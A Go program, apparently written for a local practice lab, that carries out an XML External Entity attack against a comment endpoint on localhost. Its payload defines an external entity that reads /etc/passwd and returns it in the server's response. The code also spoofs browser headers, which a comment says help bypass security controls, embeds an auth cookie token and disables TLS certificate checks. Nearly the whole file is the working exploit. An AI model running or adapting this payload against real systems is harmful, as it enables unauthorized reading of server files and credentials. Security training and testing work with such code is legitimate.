package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"net/url"
)

// main implements an XML External Entity (XXE) attack demonstration
// This code attempts to exploit an XXE vulnerability by sending a specially crafted XML payload
// that reads the contents of /etc/passwd and returns it in the response
func main() {
	// Define the vulnerable endpoint that processes XML input
	targetURL := "http://localhost:9000/comment"

	// Craft the XXE payload:
	// 1. XML declaration with version and encoding
	// 2. DOCTYPE declaration that defines an external entity named 'xxe'
	// 3. The entity references a local file (/etc/passwd) using the file:// protocol
	// 4. The comment structure uses the entity to include the file contents
	xmlContent := `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><comment><content>&xxe;</content></comment>`

	// URL encode the XML payload to ensure proper transmission
	// This prevents special characters from interfering with the request format
	encodedXML := url.QueryEscape(xmlContent)

	// Add the form parameter name "comment" to create a valid form submission
	payload := "comment=" + encodedXML

	// Create a new HTTP POST request with the payload in the request body
	req, err := http.NewRequest("POST", targetURL, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		panic(err)
	}

	// Set HTTP headers to mimic a legitimate browser request
	// This helps bypass potential security controls that validate request sources
	req.Header.Set("Host", "localhost:9000")
	req.Header.Set("Content-Length", fmt.Sprintf("%d", len(payload)))
	req.Header.Set("sec-ch-ua-platform", "\"macOS\"")
	req.Header.Set("Accept-Language", "en-GB,en;q=0.9")
	req.Header.Set("sec-ch-ua", "\"Chromium\";v=\"133\", \"Not(A:Brand\";v=\"99\"")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded") // Important: Specifies that data is form-encoded
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Origin", "http://localhost:9000")
	req.Header.Set("Sec-Fetch-Site", "same-origin")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Referer", "http://localhost:9000/xxe")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Cookie", "authToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJpYXQiOjE3NDE3MDA2NDN9.nOmGgUEwpZP0U2l_on9Nr4_Vl1aVR2-flmiy0M74tOk")
	req.Header.Set("Connection", "keep-alive")

	// Route the request through a proxy for monitoring/debugging purposes
	// This allows tools like Burp Suite or ZAP to inspect and potentially modify the traffic
	proxyURL, err := url.Parse("http://localhost:8080")
	if err != nil {
		panic(err)
	}

	// Configure an HTTP transport that uses the proxy and ignores SSL certificate validation
	// The InsecureSkipVerify option is used for testing purposes only
	// and should not be used in production environments
	transport := &http.Transport{
		Proxy:           http.ProxyURL(proxyURL),
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	// Create an HTTP client with our custom transport configuration
	client := &http.Client{Transport: transport}

	// Send the HTTP request and get the response
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close() // Ensure the response body is closed after processing

	// Read the entire response body into memory
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}

	// Print the response status code and body content
	// If the XXE attack is successful, the body should contain the contents of /etc/passwd
	fmt.Printf("\nResponse Status: %s\n", resp.Status)
	fmt.Printf("Response Body:\n%s\n", string(body))
}
